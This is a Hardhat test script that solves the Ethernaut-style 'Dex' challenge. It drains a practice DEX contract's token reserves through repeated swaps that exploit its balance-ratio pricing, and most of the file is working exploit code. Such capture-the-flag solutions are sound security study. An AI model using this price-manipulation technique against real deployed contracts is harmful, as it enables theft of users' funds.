const {ethers, network} = require("hardhat")
const {BigNumber, Contract, Signer} = require("ethers");
const {expect, assert} = require("chai")
const {getContract} = require("./helpers");
const targetName = "Dex";
const attackerName = "DexAttacker";

describe(`${targetName} challenge`, function () {

    let accounts, player, target, attacker;
    let token1, token2;
    let symbols = [];
    let targetAddress;

    beforeEach(async () => {
        accounts = await ethers.getSigners();
        player = accounts[0];
        if (network.name === 'rinkeby') {
            assert.equal(await player.getAddress(), '0xe5e00c76DB49E2aB2294b19dDb3145C8975cF8a2',
                `Address at first account (${player.address}) is not correct.`);
            targetAddress = '0x5c694dE4165d25E292F2CD80FB2b28367d8F0518';
        }

        if(network.name === 'hardhat') {
            const levelFactory = await getContract('DexFactory');
            let txn = await levelFactory.createInstance(player.address);
            txn.wait();
            let receipt = await ethers.provider.getTransactionReceipt(txn.hash);
            const log = receipt.logs[0];
            targetAddress = log.address;
            console.log(`Deployed ${targetName} using level factory at ${await levelFactory.address} to ${targetAddress}`);
            target = await getContract(targetName, targetAddress);
        } else {
            target = await getContract(targetName, targetAddress);
        }
        assert.isNotNull(target);
        console.log(`${targetName} address = ${await target.address}`);
        token1 = await getContract( 'SwappableToken', await target.token1());
        assert.isNotNull(token1);
        symbols[token1.address] = (await token1.symbol());

        token2 = await getContract( 'SwappableToken', await target.token2());
        assert.isNotNull(token2);
        symbols[token2.address] = (await token2.symbol());
    });

    it("Solves Dex challenge.", async () => {
        /*
The goal of this level is for you to hack the basic DEX contract below and
steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract
starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least
1 of the 2 tokens from the contract, and allow the contract to report a "bad"
price of the assets.
         */

        console.log(`Balances (${player.address}): token1 = ${await target.balanceOf(token1.address, player.address)}, token2 = ${await target.balanceOf(token2.address, player.address)}`)
        console.log(`Balances (${target.address}): token1 = ${await target.balanceOf(token1.address, target.address)}, token2 = ${await target.balanceOf(token2.address, target.address)}`)

        let data = { "amount": (await target.balanceOf(token1.address, player.address)).toNumber() };
        let firstBalance = (await target.balanceOf(token1.address, target.address)).toNumber();
        let secondBalance = (await target.balanceOf(token2.address, target.address)).toNumber();
        const amounts = [
            10, 20, 24, 30, 41, 45, 10
        ];
        for(const amount of amounts) {
            console.log(`Swapping ${amount} tokens...`);
            try {
                data = await values(amount);
            } catch (ve) {
                console.log("Error getting values: ", ve);
                continue;
            }
            if(data.token1.price === 0 || data.token2.price === 0) {
                console.log("Swap price is zero, will cause errors.", data);
                continue;
            }
            try {
                data = await getSwappable(data);
            } catch (se) {
                console.log("Error getting swappable values: ", se);
                continue;
            }

            firstBalance = (await target.balanceOf(data.first, target.address)).toNumber();
            data.amount = firstBalance > data.amount ? data.amount : firstBalance;
            const price = (await target.getSwapPrice(data.first, data.second, data.amount)).toNumber();

            secondBalance = (await target.balanceOf(data.second, target.address)).toNumber();

            console.log(`Balances: { amount = ${data.amount}, ${symbols[data.first]} = ${firstBalance}, ${symbols[data.second]} = ${secondBalance}, price = ${price} }`);
            await show();
            if(secondBalance > 0) {
                try {
                    await swapTokens(data);
                } catch (e) {
                    console.log("Error: ", e);
                }
                await show();
            }

            await sleep(2500);
        }
        assert.isTrue((
                (await target.balanceOf(token1.address, target.address)).toNumber() === 0 ||
                (await target.balanceOf(token2.address, target.address)).toNumber() === 0),
            "Some of both tokens remain in Dex.");
    });

    const show = async () => {
        for(const t of [token1, token2]) {
            const symbol = await t.symbol();
            for (const a of [
                {"id": "player", "address": player.address},
                {"id": "dex", "address": target.address}]) {
                target.balanceOf(t.address, a.address)
                    .then(r => console.log('\t', symbol, a.id, r.toNumber()))
                    .catch(e => console.log("Error", symbol, a.id, e));
            }
        }

    };

    const swapTokens = async ({first, second, amount}) => {
        let txn = await target.approve(target.address, amount, {
            gasPrice: 5000000000

        });
        txn.wait(1);

        txn = await target.swap(first, second, amount, {
            gasPrice: 5000000000

        });
        txn.wait(3);
    };

    const values = async (amount) => {
        const p_t1Balance = await balanceOf(token1.address, player.address);
        const p_t2Balance = await balanceOf(token2.address, player.address);
        let t1Price = 0;
        try {
            t1Price = (await target.getSwapPrice(token1.address, token2.address, amount)).toNumber();
        } catch (e) {
            // console.log(`Error getSwapPrice(${symbols[token1.address]}, ${symbols[token2.address]}): `, e.message);
        }
        let t2Price = 0;
        try {
            t2Price = (await target.getSwapPrice(token2.address, token1.address, amount)).toNumber();
        } catch (e) {
            // console.log(`Error getSwapPrice(${symbols[token2.address]}, ${symbols[token1.address]}): `, e.message);
        }
        const d_t1Balance = await balanceOf(token1.address, target.address);
        const d_t2Balance = await balanceOf(token2.address, target.address);
        const data = {
            "amount": amount,
            "token1": {
                "player": p_t1Balance,
                "price": t1Price,
                "dex": d_t1Balance
            },
            "token2": {
                "player": p_t2Balance,
                "price": t2Price,
                "dex": d_t2Balance
            }
        };
        console.log("values", data);
        return data;
    };

    const balanceOf = async (tokenAddress, holderAddress) => {
        try {
            return (await target.balanceOf(tokenAddress, holderAddress)).toNumber();
        } catch (e) {
            return 0;
        }
    }

    const getSwappable = async (data) => {
        let swappable = data.token1.player > data.token2.player ? {
            "first": token1.address, "second": token2.address, "amount": data.token1.player
        } : {
            "first": token2.address, "second": token1.address, "amount": data.token2.player
        };
        console.log("swappable", swappable);
        return swappable;
    };

    const sleep = async (timeout) => {
        return new Promise((resolve) => {
            setTimeout(resolve, timeout);
        });
    }

    it.skip("Verifies my understanding of the inner-workings of the Dex.", async () => {
        const swapAmount = 7;
        assert.equal(swapAmount, (await target.getSwapPrice(token1, token2, swapAmount)).toNumber());
        assert.equal(swapAmount, (await target.getSwapPrice(token2, token1, swapAmount)).toNumber());

        assert.equal(10, (await target.balanceOf(token1, player.address)).toNumber() );
        assert.equal(10, (await target.balanceOf(token2, player.address)).toNumber() );

        assert.equal(100, (await target.balanceOf(token1, target.address)).toNumber() );
        assert.equal(100, (await target.balanceOf(token2, target.address)).toNumber() );

        // TODO apply this logic to TheDropper project...
        let txn = await target.approve(target.address, swapAmount);
        txn.wait(1);

        txn = await target.swap(token1, token2, swapAmount);
        txn.wait(1);

        assert.equal(6, (await target.getSwapPrice(token1, token2, swapAmount)).toNumber());
        assert.equal(8, (await target.getSwapPrice(token2, token1, swapAmount)).toNumber());

        assert.equal(10 - swapAmount, (await target.balanceOf(token1, player.address)).toNumber() );
        assert.equal(10 + swapAmount, (await target.balanceOf(token2, player.address)).toNumber() );

        assert.equal(100 + swapAmount, (await target.balanceOf(token1, target.address)).toNumber() );
        assert.equal(100 - swapAmount, (await target.balanceOf(token2, target.address)).toNumber() );
    });
});